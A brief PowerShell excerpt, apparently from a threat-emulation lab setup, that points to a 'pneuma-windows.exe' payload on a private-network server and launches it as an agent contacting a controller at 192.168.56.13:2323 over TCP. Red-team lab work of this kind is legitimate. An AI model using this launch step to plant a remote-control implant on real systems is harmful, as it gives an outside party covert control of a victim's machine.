$OperatorAgentUrl = "http://192.168.56.13:3391/payloads/pneuma/v1.5/pneuma-windows.exe"
...
If (Test-Path $install_dir\pneuma-windows.exe) 
{
    ...
    Start-Process -FilePath "C:\Pneuma\pneuma-windows.exe" -ArgumentList "-address 192.168.56.13:2323 -contact tcp -name pneuma-windows10 -range thremulation"
}
